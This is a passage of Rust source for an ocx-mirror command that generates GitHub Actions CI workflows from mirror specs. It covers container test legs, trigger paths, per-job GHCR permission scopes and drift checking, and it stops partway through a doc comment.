// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The OCX Authors

//! `ocx-mirror package pipeline generate ci` — renders the GHA workflow and support
//! scripts from `mirror.yml` using baked-in templates.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use ocx_lib::cli::DataInterface;

use crate::command::package::options::OutputFormat;
use crate::error::MirrorError;
use crate::spec::{self, MirrorSpec, PlatformConfig, TestEntry};

// ── Renderer (native + container legs) ───────────────────────────────────────
//
// A platform without `containers:` renders one native leg: tests run on the GHA
// runner against the ocx that setup-ocx put on PATH. A platform WITH
// `containers:` renders one leg per image, and every `ocx package test` for that
// leg runs inside `docker run <image>` with a libc-matched, statically-linked
// ocx release mounted in.
//
// The container wrapper is the whole point of the feature: `os.features` claims
// like musl vs glibc are unverifiable until the mirrored artifact is executed
// under that libc's loader. A leg that merely renders proves nothing.
//
// Native output is byte-identical to the pre-container renderer — the extra
// matrix keys and the docker prelude are emitted only when a leg carries an
// image, and `tests/golden/` asserts that for the whole native fixture corpus.

// ── Build-time constants ─────────────────────────────────────────────────────

/// OCX-mirror crate version baked in at compile time.
const VERSION: &str = env!("CARGO_PKG_VERSION");

/// Short git SHA injected by `build.rs` via `OCX_GIT_SHA_SHORT`.
/// Falls back to `"unknown"` when the build environment has no git context.
const GIT_SHA_SHORT: &str = match option_env!("OCX_GIT_SHA_SHORT") {
    Some(sha) => sha,
    None => "unknown",
};

// ── Baked-in templates ───────────────────────────────────────────────────────

const WORKFLOW_TEMPLATE: &str = include_str!("templates/workflow.yml");
const DESCRIBE_TEMPLATE: &str = include_str!("templates/describe.yml");
const VERIFY_GENERATED_TEMPLATE: &str = include_str!("templates/verify-generated.yml");
const ANNOUNCE_FROM_REGISTRY_TEMPLATE: &str = include_str!("templates/announce-from-registry.yml");
const PATCH_TEMPLATE: &str = include_str!("templates/patch.yml");
const CASCADE_TEMPLATE: &str = include_str!("templates/cascade.yml");

// ── Spec placement ───────────────────────────────────────────────────────────

/// What `--spec` defaults to, and therefore the one spec path a generated
/// invocation can leave unsaid.
const DEFAULT_SPEC_PATH: &str = "./mirror.yml";

/// The repo-root-relative spec path that `DEFAULT_SPEC_PATH` names.
const DEFAULT_SPEC_NAME: &str = "mirror.yml";

/// Where one spec's generated workflows land, and how they refer back to it.
///
/// Everything is derived from the spec's path *relative to the repository
/// root* — never from its position in the argument list, so passing the same
/// specs in a different order renders the same bytes.
#[derive(Debug, Clone, PartialEq, Eq)]
struct SpecSlot {
    /// Spec path relative to the repo root: `mirror.yml`, `py3.13/mirror.yml`.
    relative: PathBuf,
    /// This spec's whole `extends:` chain, repo-root-relative, nearest base
    /// first. Editing any of them changes what this spec renders and publishes,
    /// so all of them belong in its `paths:` trigger.
    extends: Vec<PathBuf>,
}

impl SpecSlot {
    fn new(spec: &Path, extends: &[PathBuf], repo_root: &Path) -> Result<Self, MirrorError> {
        let relative = spec.strip_prefix(repo_root).map_err(|_| {
            MirrorError::SpecUsageError(format!(
                "spec {} is not under the repository root {} — pass --repo-root",
                spec.display(),
                repo_root.display(),
            ))
        })?;
        // A base above the root is the same failure as a spec above the root,
        // one step further out: `paths:` can only name files the workflow's own
        // repository contains, so a trigger for it would silently never fire —
        // which is exactly what putting the chain in the trigger is fixing.
        let extends = extends
            .iter()
            .map(|base| {
                base.strip_prefix(repo_root).map(Path::to_path_buf).map_err(|_| {
                    MirrorError::SpecUsageError(format!(
                        "spec {} extends {}, which is not under the repository root {} — \
                         a `paths:` trigger cannot name a file outside the repository, so editing \
                         that base would run nothing; move it under the root or pass --repo-root",
                        spec.display(),
                        base.display(),
                        repo_root.display(),
                    ))
                })
            })
            .collect::<Result<Vec<_>, _>>()?;
        Ok(Self {
            relative: relative.to_path_buf(),
            extends,
        })
    }

    /// The `extends` chain as `paths:` entries, dropping any base the spec's own
    /// subtree glob already covers.
    fn extends_entries(&self) -> Vec<String> {
        let own_subtree = self.dir().map(|dir| format!("{}/", slash_path(dir)));
        self.extends
            .iter()
            .map(|base| slash_path(base))
            .filter(|base| !own_subtree.as_ref().is_some_and(|prefix| base.starts_with(prefix)))
            .collect()
    }

    /// The spec's own directory relative to the repo root; `None` at the root.
    fn dir(&self) -> Option<&Path> {
        self.relative.parent().filter(|dir| !dir.as_os_str().is_empty())
    }

    /// Filename suffix for this spec's workflows — empty at the repo root,
    /// `-py3.13` for `py3.13/mirror.yml`, `-a-b` for `a/b/mirror.yml`.
    fn suffix(&self) -> String {
        match self.dir() {
            None => String::new(),
            Some(dir) => format!("-{}", slash_path(dir).replace('/', "-")),
        }
    }

    /// Repo-root-relative path of one of this spec's generated workflows.
    fn workflow(&self, stem: &str) -> PathBuf {
        PathBuf::from(format!(".github/workflows/{}", self.workflow_name(stem)))
    }

    /// Bare filename of one of this spec's generated workflows.
    fn workflow_name(&self, stem: &str) -> String {
        format!("{stem}{}.yml", self.suffix())
    }

    /// The spec path as the generated workflows spell it: repo-root-relative
    /// and `/`-separated, because they are read on a Linux runner.
    fn source(&self) -> String {
        slash_path(&self.relative)
    }

    /// `--spec <path>` threaded into this spec's generated invocations.
    ///
    /// Empty for the repo-root `mirror.yml`, whose path is exactly what every
    /// pipeline command already defaults to — omitting it is what keeps the
    /// published mirror repositories byte-identical to what they have
    /// committed. Any other location is named explicitly.
    fn spec_arg(&self) -> String {
        if self.is_default() {
            String::new()
        } else {
            format!(" --spec {}", self.source())
        }
    }

    fn is_default(&self) -> bool {
        self.relative == Path::new(DEFAULT_SPEC_NAME)
    }
}

/// `Path` → `/`-separated string. Generated workflows run on a Linux runner,
/// so the separator is never the generating host's.
fn slash_path(path: &Path) -> String {
    path.components()
        .map(|component| component.as_os_str().to_string_lossy())
        .collect::<Vec<_>>()
        .join("/")
}

// ── Public struct ────────────────────────────────────────────────────────────

/// Generate (or check) the CI workflow files for a mirror repository.
///
/// One repository may hold several specs; `--spec` repeats. Generated
/// filenames derive from where each spec sits under the repository root:
/// `<root>/mirror.yml` renders `mirror.yml`, `describe.yml`, `patch.yml`,
/// `cascade.yml` when it cascades and `announce-from-registry.yml` when it
/// announces, while
/// `<root>/py3.13/mirror.yml` renders the same set suffixed `-py3.13`. The
/// `verify-generated.yml` drift guard is
/// emitted once per repository and bakes in the full spec list, so the
/// committed file is the record of which specs the repository has.
///
/// In `--check` mode: exits 65 (DataError) if any generated file drifts from
/// what would be produced, or if a generated workflow belongs to no spec any
/// more; emits path-only hints to stderr.
#[derive(clap::Parser)]
pub struct GenerateCi {
    /// Path to the mirror spec file; repeat once per spec the repository holds.
    #[arg(long, default_value = DEFAULT_SPEC_PATH)]
    pub spec: Vec<PathBuf>,

    /// Repository root the workflows are written under [default: the directory every spec shares].
    #[arg(long)]
    pub repo_root: Option<PathBuf>,

    /// Check mode: verify generated files are up-to-date; exit 65 on drift.
    #[arg(long)]
    pub check: bool,

    /// Output format for diagnostics.
    #[arg(long)]
    pub format: Option<OutputFormat>,
}

impl GenerateCi {
    pub async fn execute(&self, _printer: &DataInterface) -> Result<(), MirrorError> {
        // Phases 1–3 per spec: raw pre-flight, structural load, content policy.
        let mut specs = Vec::with_capacity(self.spec.len());
        for path in &self.spec {
            specs.push((path.clone(), load_one(path).await?));
        }

        // Phase 4: place every spec — and every base it extends — under the
        // repository root, then render.
        let repo_root = self.resolve_repo_root().await?;
        let mut placed = Vec::with_capacity(specs.len());
        for (path, (spec, chain)) in specs {
            let mut bases = Vec::with_capacity(chain.len());
            for base in &chain {
                bases.push(canonical(base).await?);
            }
            let slot = SpecSlot::new(&canonical(&path).await?, &bases, &repo_root)?;
            placed.push((slot, spec));
        }
        // Sorted so neither the rendered bytes nor the drift verdict depend on
        // the order the specs were passed in.
        placed.sort_by(|(a, _), (b, _)| a.relative.cmp(&b.relative));
        reject_colliding_slots(&placed)?;

        let named = placed.len() > 1;
        // `script:` paths are the one thing only the repository root can resolve,
        // and this is the only command that knows it.
        let invalid: Vec<String> = placed
            .iter()
            .flat_map(|(slot, spec)| {
                spec::validate_test_scripts(spec, &repo_root, slot.dir())
                    .into_iter()
                    .map(|error| format!("{}{error}", label(slot, named)))
            })
            .collect();
        if !invalid.is_empty() {
            return Err(MirrorError::SpecInvalid(invalid));
        }

        for (slot, spec) in &placed {
            if let Some(warning) = ghcr_owner_warning(spec, std::env::var("GITHUB_REPOSITORY").ok().as_deref()) {
                eprintln!("warning: {}{warning}", label(slot, named));
            }
        }
        report_manual_edits(&placed);

        let files = render(&placed);

        // Phase 5: write or check.
        if self.check {
            check_drift(&files, &repo_root).await
        } else {
            write_files(&files, &repo_root).await
        }
    }

    /// The directory the generated workflows are written under.
    ///
    /// An explicit `--repo-root` wins. Otherwise it is the enclosing git
    /// repository, which is the same answer for one nested spec as for five.
    /// Inferring it from the spec set is not: the deepest directory a *single*
    /// nested spec shares is its own parent, so a repo-root-relative
    /// `tests: script:` had the spec directory prepended twice
    /// (`repo/tool/tool/tests/smoke.star`) and an `extends:` base above the
    /// spec read as outside the repository. Every single-spec-in-a-subdirectory
    /// repo failed its own drift guard; five-spec repos passed only because
    /// their common ancestor happened to be the real root.
    ///
    /// Falls back to the shared ancestor outside a git repository — rendering
    /// into a bare directory has no better answer, and the process CWD would be
    /// worse: `generate ci --spec /elsewhere/repo/mirror.yml` must write into
    /// that repository, not wherever it was invoked from.
    async fn resolve_repo_root(&self) -> Result<PathBuf, MirrorError> {
        if let Some(root) = &self.repo_root {
            return canonical(root).await;
        }
        let mut shared: Option<PathBuf> = None;
        for path in &self.spec {
            let parent = canonical(spec_parent(path)).await?;
            if let Some(root) = git_root(&parent) {
                // A spec outside this root is caught by `SpecSlot::new`, which
                // is a better error than silently rooting at an ancestor of two
                // unrelated repositories.
                return Ok(root);
            }
            shared = Some(match shared {
                None => parent,
                Some(current) => common_ancestor(&current, &parent),
            });
        }
        shared.ok_or_else(|| MirrorError::SpecUsageError("no --spec given".to_string()))
    }
}

/// The nearest ancestor of `dir` holding a `.git`, or `None` outside a
/// repository.
///
/// `.git` is a directory in a normal clone and a *file* in a worktree or
/// submodule checkout, so existence is the test, not file type.
///
/// ponytail: sync `exists()` in an async fn — one short upward walk, once per
/// invocation. Reach for `tokio::fs` here only if this ever runs per-spec.
fn git_root(dir: &Path) -> Option<PathBuf> {
    dir.ancestors()
        .find(|ancestor| ancestor.join(".git").exists())
        .map(Path::to_path_buf)
}

/// Read, pre-flight and validate one spec file (phases 1–3).
///
/// Returns the merged spec alongside its `extends:` chain — the merged spec has
/// no record of where its keys came from, and the renderer needs the base paths
/// to trigger on them.
async fn load_one(path: &Path) -> Result<(MirrorSpec, Vec<PathBuf>), MirrorError> {
    // Phase 1: policy-level pre-flight before load_spec.
    //
    // Check for `ocx_install:` key in the raw YAML text. MirrorSpec uses
    // `#[serde(deny_unknown_fields)]` so load_spec would emit SpecInvalid (65),
    // but plan §1.8 requires SpecUsageError (64) for this specific case.
    // Peeking the raw bytes lets us intercept before serde rejects it.
    let raw = tokio::fs::read_to_string(path)
        .await
        .map_err(|e| MirrorError::SpecNotFound(format!("{}: {e}", path.display())))?;

    if raw.lines().any(|line| {
        let trimmed = line.trim_start();
        trimmed.starts_with("ocx_install:") || trimmed == "ocx_install:"
    }) {
        return Err(MirrorError::SpecUsageError(
            "ocx binary is installed via direct release download; \
             remove `ocx_install:` block. \
             Override `OCX_BINARY_OVERRIDE` env var at workflow level for integration tests"
                .to_string(),
        ));
    }

    // Phase 2: load and validate spec (structural validation).
    let chain = spec::resolve_extends_chain(path, &raw).await?;
    let spec = spec::load_spec(path).await?;

    // Phase 3: content-policy validation on the parsed spec.
    policy_check_notify(&spec)?;

    Ok((spec, chain))
}

/// Resolve a path against the filesystem so spec paths and the repository root
/// are comparable regardless of which of them the caller spelled relatively.
async fn canonical(path: &Path) -> Result<PathBuf, MirrorError> {
    tokio::fs::canonicalize(path)
        .await
        .map_err(|e| MirrorError::SpecUsageError(format!("cannot resolve {}: {e}", path.display())))
}

/// The directory holding `spec`, with a bare filename resolving to `.`.
fn spec_parent(spec: &Path) -> &Path {
    match spec.parent() {
        Some(parent) if !parent.as_os_str().is_empty() => parent,
        _ => Path::new("."),
    }
}

/// Deepest directory both paths lie under. Both are canonical, so they share at
/// least the filesystem root.
fn common_ancestor(a: &Path, b: &Path) -> PathBuf {
    a.components()
        .zip(b.components())
        .take_while(|(x, y)| x == y)
        .map(|(x, _)| x)
        .collect()
}

/// Reject two specs that would render the same workflow set.
///
/// Output names come from the spec's *directory*, so two specs sharing one
/// directory would silently overwrite each other — the exact failure repeatable
/// `--spec` exists to fix. Expects `placed` sorted by relative path.
fn reject_colliding_slots(placed: &[(SpecSlot, MirrorSpec)]) -> Result<(), MirrorError> {
    for pair in placed.windows(2) {
        let (first, second) = (&pair[0].0, &pair[1].0);
        if first.suffix() == second.suffix() {
            return Err(MirrorError::SpecUsageError(format!(
                "specs `{}` and `{}` would render the same workflow files — \
                 generated names derive from the spec's directory, so each spec needs its own",
                first.source(),
                second.source(),
            )));
        }
    }
    Ok(())
}

/// `"<spec>: "` when the run covers several specs, so a warning names the one
/// it is about; empty for the single-spec repository, where it would be noise.
fn label(slot: &SpecSlot, named: bool) -> String {
    if named {
        format!("{}: ", slot.source())
    } else {
        String::new()
    }
}

/// Surface the discouraged `allow_manual_edits` opt-out so it is never silently
/// in effect: the drift guard is the only thing keeping generated workflows
/// honest.
///
/// One guard covers the whole repository, so a repository whose specs disagree
/// gets the guard — the strictest spec wins, and the opt-out only takes effect
/// when every spec asks for it. Naming the dissenters is what makes an
/// unexpectedly-present guard explicable.
fn report_manual_edits(placed: &[(SpecSlot, MirrorSpec)]) {
    let opted_out: Vec<String> = placed
        .iter()
        .filter(|(_, spec)| spec.allow_manual_edits)
        .map(|(slot, _)| slot.source())
        .collect();
    if opted_out.is_empty() {
        return;
    }
    if opted_out.len() == placed.len() {
        eprintln!(
            "note: allow_manual_edits is set — the generated-workflow drift guard \
             (verify-generated.yml) is not emitted; hand-edits to generated workflows \
             go unchecked (discouraged)"
        );
    } else {
        eprintln!(
            "warning: allow_manual_edits is set on {} but not on every spec — one drift guard \
             covers the whole repository, so verify-generated.yml is emitted anyway and \
             hand-edits to those specs' workflows still fail CI",
            opted_out.join(", "),
        );
    }
}

// ── Policy validation ────────────────────────────────────────────────────────

/// Content-policy check on the `notify:` block.
///
/// Delegates to `spec::policy_check_notify` so the check logic lives in one place
/// and always returns `SpecUsageError (64)` for URL-literal webhook secrets.
/// `load_spec` already calls this before structural validation, so this call in
/// the renderer is a defence-in-depth guard for specs loaded via other paths.
fn policy_check_notify(spec: &MirrorSpec) -> Result<(), MirrorError> {
    let Some(notify) = &spec.notify else {
        return Ok(());
    };
    spec::policy_check_notify(notify)
}

// ── Renderer ─────────────────────────────────────────────────────────────────

/// The kind of a rendered test entry — mirrors [`spec::TestKind`] but owns its
/// payload so it can outlive the spec borrow in `MatrixLeg`.
#[derive(Debug, Clone, PartialEq)]
enum RenderedTestKind {
    Command(String),
    Script(String),
    ScriptInline(String),
}

/// One rendered test entry carried in a matrix leg.
#[derive(Debug, Clone)]
struct RenderedTest {
    name: String,
    kind: RenderedTestKind,
}

/// Describes one matrix leg (test job matrix entry).
///
/// A native leg has an empty `container_image` and the sentinel `container_id`
/// `_native_`. A container leg carries the image, its libc family (which ocx
/// release binary to mount) and a stable `container_id` taken from the config
/// `id` or the slugified image. Downstream consumers (`pipeline push`,
/// `junit.rs`) key on `(version, platform, container)` triples in JUnit XML and
/// run-summary.json, so `container_id` stays meaningful in both modes.
struct MatrixLeg {
    platform: String,
    platform_slug: String,
    runner: String,
    container_id: String,
    /// Container image reference; empty for a native leg.
    container_image: String,
    /// Container libc family (`musl` / `gnu`); empty for a native leg.
    container_libc: String,
    /// `platform` with any `os.features` suffix stripped — what
    /// `docker run --platform` accepts. Empty for a native leg.
    docker_platform: String,
    /// Dockerfile provisioning this leg's image from the container's `setup:`
    /// commands. Empty when the container declares none — which is also what
    /// gates every piece of setup machinery out of the rendered workflow.
    container_dockerfile: String,
    shell: String,
    tests: Vec<RenderedTest>,
}

/// Render the Dockerfile that provisions one container leg.
///
/// `RUN` in shell form hands the line to the image's `SHELL` unparsed, so the
/// YAML → Rust → Dockerfile → shell trip copies the command through. The shapes
/// that would not arrive as one `RUN` — an embedded newline, a trailing
/// backslash — are rejected by `validate_container_setup` before the renderer
/// sees them. A `${{ … }}` in a command is emitted raw and interpolated by
/// Actions, the same surface `tests[].command` already has.
fn render_setup_dockerfile(image: &str, shell: &str, setup: &[String]) -> String {
    // `{shell:?}` is the JSON-quoted exec form `SHELL` requires.
    let mut dockerfile = format!("FROM {image}\nSHELL [{shell:?}, \"-c\"]\n");
    for command in setup {
        dockerfile.push_str(&format!("RUN {command}\n"));
    }
    dockerfile
}

/// Does any leg provision its image?
///
/// One gate for the whole feature: the matrix key, the `env:` passthrough and
/// the build block are meaningless apart, so they appear together or not at
/// all — and a spec declaring no `setup:` renders exactly what it did before.
fn any_container_setup(legs: &[MatrixLeg]) -> bool {
    legs.iter().any(|leg| !leg.container_dockerfile.is_empty())
}

/// Convert a slice of [`TestEntry`] into [`RenderedTest`] list.
///
/// Entries that fail `kind()` (i.e. validated-invalid specs that slip through)
/// are silently omitted — `validate_tests` is the authoritative gate.
fn render_tests(entries: &[TestEntry]) -> Vec<RenderedTest> {
    entries
        .iter()
        .filter_map(|t| {
            let kind = match t.kind() {
                Ok(spec::TestKind::Command(cmd)) => RenderedTestKind::Command(cmd.to_owned()),
                Ok(spec::TestKind::Script(p)) => RenderedTestKind::Script(p.display().to_string()),
                Ok(spec::TestKind::ScriptInline(src)) => RenderedTestKind::ScriptInline(src.to_owned()),
                Err(_) => return None,
            };
            Some(RenderedTest {
                name: t.name.clone(),
                kind,
            })
        })
        .collect()
}

/// Build the flat list of matrix legs from a `MirrorSpec`.
fn build_matrix(spec: &MirrorSpec) -> Vec<MatrixLeg> {
    let Some(platforms) = &spec.platforms else {
        return Vec::new();
    };

    let top_level_tests: Vec<RenderedTest> = render_tests(spec.tests.as_deref().unwrap_or(&[]));

    // Stable ordering: sort platform keys alphabetically so the generated YAML
    // is deterministic across runs.
    let mut platform_keys: Vec<&String> = platforms.keys().collect();
    platform_keys.sort();

    let mut legs = Vec::new();
    for platform_key in platform_keys {
        let config = &platforms[platform_key];
        // Must equal the basename `pipeline prepare` gives this platform's work
        // directory — the workflow flattens that into `bundle-{V}-{slug}.tar.xz`
        // and names the leg's JUnit file with it. A libc-bearing key slugs to
        // `linux_amd64_libc.musl` there, so `replace('/', "_")` here pointed the
        // leg at a bundle that does not exist.
        let platform_slug = spec::platform_key_slug(platform_key);

        let effective_tests: Vec<RenderedTest> = config
            .tests
            .as_deref()
            .map(render_tests)
            .unwrap_or_else(|| top_level_tests.clone());

        match config.containers.as_deref().filter(|c| !c.is_empty()) {
            // Container mode: one leg per image, each testing the same artifact
            // under a different userland.
            Some(containers) => {
                for container in containers {
                    // Same slug `pipeline push` uses to find this leg's JUnit
                    // file. Diverging here loses every container result.
                    let container_id = container
                        .id
                        .clone()
                        .unwrap_or_else(|| spec::image_to_container_id(&container.image));
                    // Validation guarantees an explicit shell whenever the image
                    // has no known default, so the fallback is unreachable for a
                    // validated spec; POSIX `sh` is the safest thing to guess.
                    let shell = container.shell.clone().unwrap_or_else(|| {
                        spec::infer_shell_from_image(&container.image)
                            .unwrap_or("sh")
                            .to_string()
                    });
                    // Validation rejects an empty `setup:`, so the filter only
                    // guards against a spec that skipped it — an empty list
                    // must render as "no setup", never as a bare `FROM`.
                    let container_dockerfile = container
                        .setup
                        .as_deref()
                        .filter(|setup| !setup.is_empty())
                        .map(|setup| render_setup_dockerfile(&container.image, &shell, setup))
                        .unwrap_or_default();
                    legs.push(MatrixLeg {
                        platform: platform_key.clone(),
                        platform_slug: platform_slug.clone(),
                        runner: config.runner.clone(),
                        container_id,
                        container_image: container.image.clone(),
                        container_libc: spec::infer_libc_from_image(&container.image).to_string(),
                        docker_platform: spec::platform_without_features(platform_key),
                        container_dockerfile,
                        shell,
                        tests: effective_tests.clone(),
                    });
                }
            }
            None => {
                let shell = native_shell_for_platform(platform_key, config);
                legs.push(MatrixLeg {
                    platform: platform_key.clone(),
                    platform_slug: platform_slug.clone(),
                    runner: config.runner.clone(),
                    container_id: "_native_".to_string(),
                    container_image: String::new(),
                    container_libc: String::new(),
                    docker_platform: String::new(),
                    container_dockerfile: String::new(),
                    shell: shell.to_string(),
                    tests: effective_tests,
                });
            }
        }
    }
    legs
}

/// Determine the shell for a native test leg.
fn native_shell_for_platform<'a>(platform: &str, config: &'a PlatformConfig) -> &'a str {
    if let Some(shell) = &config.shell {
        return shell.as_str();
    }
    if platform.starts_with("windows") {
        "pwsh"
    } else {
        "bash"
    }
}

/// Render `on.*.paths` entries for one spec.
///
/// A repo-root spec keeps the repo-wide list it has always had. A spec in a
/// subdirectory watches that subtree instead, so editing `py3.13/` never wakes
/// the sibling specs' workflows. `root_entries` is the root spec's list minus
/// its own workflow file, which is appended for both cases.
///
/// Every base in the spec's `extends:` chain is watched too: the shared base of
/// a multi-spec repository sits *outside* every child's subtree, so a change to
/// the platform matrix or the container set there would otherwise re-run
/// nothing at all.
fn trigger_paths(slot: &SpecSlot, root_entries: &[String], stem: &str) -> String {
    let mut entries = match slot.dir() {
        None => root_entries.to_vec(),
        Some(dir) => vec![format!("{}/**", slash_path(dir))],
    };
    entries.extend(slot.extends_entries());
    entries.push(format!(".github/workflows/{}", slot.workflow_name(stem)));

    // A nested spec's subtree trigger only covers files under that subtree,
    // while a test's `script:` path resolves from the repository root — unlike
    // `metadata.default` and `catalog.*`, which resolve against the spec's own
    // directory. Say so where the gap is, or the first Starlark test in a
    // subdirectory spec silently stops triggering its own workflow.
    let note = match slot.dir() {
        None => String::new(),
        Some(dir) => format!(
            "      # `script:` paths resolve from the repository root, not from {0}/ —\n\
             \x20     # keep this spec's scripts under {0}/ so editing one triggers this run.\n",
            slash_path(dir),
        ),
    };

    format!("{note}{}", indent_entries(&entries))
}

/// Format path entries as a YAML sequence under `paths:` (no trailing newline —
/// the templates supply the surrounding lines).
fn indent_entries(entries: &[String]) -> String {
    entries
        .iter()
        .map(|entry| format!("      - {entry}"))
        .collect::<Vec<_>>()
        .join("\n")
}

/// Render the GHA workflow YAML from a parsed spec.
///
/// Substitution uses a simple `str::replace` chain — no templating engine dep.
fn render_workflow(spec: &MirrorSpec, slot: &SpecSlot) -> String {
    let schedule_block = schedule_block(spec.versions.as_ref().and_then(|v| v.poll_interval.as_ref()));

    // `webhook_secret` names the *GitHub Actions secret* that carries the
    // webhook URL — the rendered workflow maps it onto the conventional local
    // env var `OCX_MIRROR_DISCORD_HOOK`, which `pipeline notify` reads.
    let webhook_secret_name = spec
        .notify
        .as_ref()
        .and_then(|n| n.discord.as_ref())
        .map(|d| d.webhook_secret.as_str())
        .unwrap_or("OCX_MIRROR_DISCORD_HOOK");

    // The Discord user id is non-secret — inline it verbatim into the notify
    // job env. Absent → the placeholder collapses to nothing so the env block
    // carries only the webhook hook line.
    let discord_user_id_env = spec
        .notify
        .as_ref()
        .and_then(|n| n.discord.as_ref())
        .and_then(|d| d.user_id.as_ref())
        .map(|id| format!("\n          OCX_MIRROR_DISCORD_USER_ID: \"{id}\""))
        .unwrap_or_default();

    let matrix = build_matrix(spec);
    let matrix_entries = render_matrix_entries(&matrix);
    let test_run_steps = render_test_run_steps(&matrix);
    let target_identifier = spec.target.reference();

    // The Dockerfile reaches the shell through `env:`, not an inline `${{ }}`:
    // it is multi-line and carries the setup commands' own quoting, neither of
    // which survives interpolation into a shell script. Absent → the
    // placeholder collapses and the env block is the one line it always was.
    let container_setup_env = if any_container_setup(&matrix) {
        "\n          OCX_CONTAINER_DOCKERFILE: ${{ matrix.container_dockerfile }}".to_string()
    } else {
        String::new()
    };

    let triggers = trigger_paths(
        slot,
        &[
            slot.source(),
            "scripts/**".to_string(),
            "tests/**".to_string(),
            "metadata*.json".to_string(),
        ],
        "mirror",
    );

    WORKFLOW_TEMPLATE
        .replace("{OCX_MIRROR_VERSION}", VERSION)
        .replace("{OCX_MIRROR_REV}", GIT_SHA_SHORT)
        .replace("{SPEC_SOURCE}", &slot.source())
        .replace("{SPEC_ARG}", &slot.spec_arg())
        .replace("{TRIGGER_PATHS}", &triggers)
        .replace("{MIRROR_NAME}", &spec.name)
        .replace("{SCHEDULE_BLOCK}", &schedule_block)
        .replace("{TEST_MATRIX_ENTRIES}", &matrix_entries)
        .replace("{TEST_RUN_STEPS}", &test_run_steps)
        // Substituted after `{TEST_RUN_STEPS}` — the placeholder lives inside the
        // container prelude that step just injected.
        .replace("{OCX_CLI_TAG}", OCX_CONTAINER_CLI_TAG)
        .replace("{OCX_CLI_VERSION}", ocx_cli_version())
        .replace("{TARGET_IDENTIFIER}", &target_identifier)
        .replace("{TARGET_REGISTRY}", &spec.target.registry)
        .replace("{DISCOVER_PERMISSIONS}", render_discover_permissions(spec))
        .replace("{DISCOVER_AUTH_STEPS}", &render_discover_auth_steps(spec))
        .replace("{PUSH_PERMISSIONS}", render_push_permissions(spec))
        .replace("{REGISTRY_AUTH_STEPS}", &render_registry_auth_steps(spec))
        .replace("{WEBHOOK_SECRET_NAME}", webhook_secret_name)
        .replace("{DISCORD_USER_ID_ENV}", &discord_user_id_env)
        .replace("{CONTAINER_SETUP_ENV}", &container_setup_env)
}

/// GitHub's own container registry — authenticated with the workflow's
/// `GITHUB_TOKEN`, not with the shared `OCX_MIRROR_REGISTRY_*` org secrets.
const GHCR_REGISTRY: &str = "ghcr.io";

/// `permissions:` block for the push job.
///
/// GHCR needs `packages: write` on the run's `GITHUB_TOKEN` to accept a push.
/// Other registries authenticate with an org secret and need no extra token
/// scope, so the block is omitted entirely there and the job keeps the
/// repository's default token scopes.
///
/// Naming *any* permission sets every unnamed scope to `none`, so this block is
/// the whole token for that job and every step in it has to be paid for:
///
/// | Scope | Step that needs it |
/// |---|---|
/// | `contents: read` | `actions/checkout`, `setup-ocx` |
/// | `packages: write` | `docker login ghcr.io` + `ocx package push` |
/// | `actions: read` | `gh api …/actions/runs/N/jobs` resolving the push job URL |
/// | `checks: write` | `publish-unit-test-result-action`'s check run |
/// | `pull-requests: write` | the same action's pull-request comment |
///
/// `actions: read` is the one that fails silently: the `gh api` call ends in
/// `| head -n1 || true`, so a 403 leaves `OCX_MIRROR_JOB_URL` empty and every
/// Discord row quietly loses its link. The two `publish-unit-test-result-action`
/// scopes are the pairing this repository's own `verify.yml` already uses with
/// the same pinned action; without them that step 403s under `if: always()` and
/// reds the push job on every run that published perfectly.
///
/// `actions/upload-artifact` and `actions/download-artifact` authenticate with
/// the runtime token for same-run artifacts, not with `GITHUB_TOKEN`, so they
/// need no scope of their own. The announce subprocess uses `OCX_ANNOUNCE_TOKEN`
/// — a separate secret, not this token.
const GHCR_PUSH_PERMISSIONS: &str = "    permissions:\n      contents: read\n      packages: write\n      actions: read\n      checks: write\n      pull-requests: write\n";

fn render_push_permissions(spec: &MirrorSpec) -> &'static str {
    if spec.target.registry == GHCR_REGISTRY {
        GHCR_PUSH_PERMISSIONS
    } else {
        ""
    }
}

/// `permissions:` block for the discover job.
///
/// Only `contents: read` (checkout, setup-ocx) and `packages: read` — discover
/// lists the target's tags and writes nothing.
const GHCR_DISCOVER_PERMISSIONS: &str = "    permissions:\n      contents: read\n      packages: read\n";

fn render_discover_permissions(spec: &MirrorSpec) -> &'static str {
    if spec.target.registry == GHCR_REGISTRY {
        GHCR_DISCOVER_PERMISSIONS
    } else {
        ""
    }
}

/// `permissions:` block for a job that checks out, installs ocx and writes to
/// the target registry: the describe job and the patch job.
///
/// `pipeline describe` pushes the catalog metadata as an `__ocx.desc` referrer
/// and `pipeline patch` re-emits published manifests, so GHCR needs
/// `packages: write` for both — the read scope discover gets is not enough.
/// Neither job runs tests, resolves a job URL or comments on a pull request, so
/// none of the push job's other three scopes are paid for here; naming any
/// permission sets every unnamed one to `none`, which is what makes that
/// omission real rather than decorative. The announce a patch chains into
/// writes to the *index* repository through `OCX_ANNOUNCE_TOKEN`, never through
/// this job's `GITHUB_TOKEN`.
const GHCR_REGISTRY_WRITE_PERMISSIONS: &str = "    permissions:\n      contents: read\n      packages: write\n";

fn render_registry_write_permissions(spec: &MirrorSpec) -> &'static str {
    if spec.target.registry == GHCR_REGISTRY {
        GHCR_REGISTRY_WRITE_PERMISSIONS
    } else {
        ""
    }
}

/// Registry-login step for the discover job.
///
/// `pipeline plan` reads the target's tag list to decide which versions are
/// new. GHCR answers an *unauthenticated* read of a repository that does not
/// exist — or is private — with `403 DENIED`, never `404`; it does not reveal
/// non-existence to anonymous callers. `list_target_tags` deliberately treats
/// only an authoritative not-found as "nothing published" (issue #157), so
/// without a credential here the very first run of a new GHCR mirror aborts in
/// discover and the target can never come into existence.
///
/// A public non-GHCR target lists anonymously, so no login is emitted there —
/// the shared `OCX_MIRROR_REGISTRY_*` secrets stay confined to the push job.
fn render_discover_auth_steps(spec: &MirrorSpec) -> String {
    if spec.target.registry != GHCR_REGISTRY {
        return String::new();
    }
    format!(
        r#"      # `pipeline plan` reads the target's tags. ghcr.io answers an
      # anonymous read of a missing or private repository with 403 DENIED
      # rather than 404, so an unauthenticated discover can never see the
      # empty target a first publish starts from. docker login so ocx picks
      # the credential up via its native-credential fallback.
      - name: Login to {ghcr}
        run: |
          echo "${{{{ secrets.GITHUB_TOKEN }}}}" \
            | docker login {ghcr} \
                -u "${{{{ github.actor }}}}" \
                --password-stdin
"#,
        ghcr = GHCR_REGISTRY,
    )
}

/// Best-effort warning that a `ghcr.io` target sits outside the publishing
/// repository's owner.
///
/// `GITHUB_TOKEN` authorises packages owned by *this repository's* owner only.
